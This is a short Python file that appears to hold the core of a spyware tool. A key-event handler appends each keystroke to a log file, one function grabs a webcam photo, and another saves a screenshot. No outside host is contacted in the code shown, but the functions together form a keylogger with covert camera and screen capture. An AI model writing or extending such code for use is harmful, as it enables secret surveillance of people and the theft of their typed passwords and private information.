import cv2
import pyscreenshot

def on_press(event):
    log_file = 'content/logfile.txt'
    try:
        if event.name == 'space':
            with open(log_file, "a") as f:
                f.write("__")
        with open(log_file, "a") as f:
            f.write(event.name)
    except Exception as e:
        pass

def get_img():
    videoCaptureObject = cv2.VideoCapture(0)
    result = True
    while(result):
        ret,frame = videoCaptureObject.read()
        cv2.imwrite("content/photo.png", frame)
        result = False
    videoCaptureObject.release()
    cv2.destroyAllWindows()

def get_screen():
    my_screenshot = pyscreenshot.grab()
    my_screenshot.save("content/screen.png")
